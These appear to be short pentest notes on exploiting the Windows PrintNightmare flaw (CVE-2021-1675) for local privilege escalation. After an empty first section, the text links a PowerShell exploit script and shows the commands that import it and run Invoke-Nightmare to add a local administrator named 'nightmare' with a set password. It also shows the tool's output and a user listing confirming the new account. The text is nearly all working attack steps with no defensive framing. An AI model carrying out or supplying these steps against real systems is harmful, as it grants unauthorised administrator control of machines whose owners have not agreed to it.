
# Printnightmare LPE Sharpprintnightmare

to do



# Printnightmare LPE Powershell

Download script from here : https://github.com/gyaansastra/Print-Nightmare-LPE

check current users

	PS C:\Users\testuser\Desktop\share> net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	Administrator            DefaultAccount           Guest
	WDAGUtilityAccount       win10
	The command completed successfully.


import and execute script

	PS C:\Users\testuser\Desktop\share> . .\CVE-2021-1675.ps1
	PS C:\Users\testuser\Desktop\share> Invoke-Nightmare -NewUser nightmare -NewPassword "Pass123!" -DriverName "printme"
	[+] created payload at C:\Users\win10\AppData\Local\Temp\nightmare.dll
	[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_c62e9f8067f98247\Amd64\mxdwdrv.dll"
	[+] added user nightmare as local administrator
	[+] deleting payload from C:\Users\win10\AppData\Local\Temp\nightmare.dll
	PS C:\Users\testuser\Desktop\share> net user

	User accounts for \\PC-WIN10

	-------------------------------------------------------------------------------
	Administrator            DefaultAccount           Guest
	nightmare                WDAGUtilityAccount       win10
	The command completed successfully.

	PS C:\Users\testuser\Desktop\share>
